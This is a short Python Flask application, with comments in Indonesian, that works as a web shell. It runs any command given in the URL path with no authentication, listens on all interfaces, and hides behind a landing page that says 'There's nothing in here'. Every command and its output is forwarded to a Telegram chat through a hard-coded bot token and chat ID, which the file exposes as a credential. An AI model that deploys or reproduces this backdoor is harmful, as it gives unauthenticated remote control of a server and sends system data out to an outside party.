
from flask import Flask, request, render_template_string, Response
import subprocess
from ansi2html import Ansi2HTMLConverter
import requests

app = Flask(__name__)
conv = Ansi2HTMLConverter(inline=True)

# Ganti dengan Telegram Bot API Token Anda
BOT_TOKEN = "7194657474:AAF3D5TSXSSgAcnv_PXT4wRrKx5fV-VTNJo"
CHAT_ID = "-1001966063772"

def send_telegram_message(message):
    """Mengirim pesan ke Telegram Bot."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML" 
    }
    requests.post(url, data=data)

@app.route('/', defaults={'command': ''})
@app.route('/<path:command>')
def execute_command(command):
    try:
        if not command:
            return render_template_string('''
                <h1>There's nothing in here:)</h1>
                <form method="GET">
                    <input type="text" name="command" placeholder="Enter command">
                    <button type="submit">Execute</button>
                </form>
            ''')

        command = command.replace("_", " ")

        # Log Perintah yang akan dijalankan ke Telegram
        send_telegram_message(f"<b>Menjalankan perintah:</b>\n<code>{command}</code>")

        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()

        # Kirim output dan error ke Telegram
        if stdout:
            send_telegram_message(f"<b>Output:</b>\n<pre>{stdout}</pre>")
        if stderr:
            send_telegram_message(f"<b>Error:</b>\n<pre>{stderr}</pre>")

        # Tampilkan hanya output di halaman web
        html_output = conv.convert(stdout, full=False)  # Hanya konversi stdout
        return render_template_string('''{{ output | safe }}''', 
            output=html_output
        )
    except Exception as e:
        send_telegram_message(f"<b>Error:</b> {e}")
        return f"Error: {e}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8501)
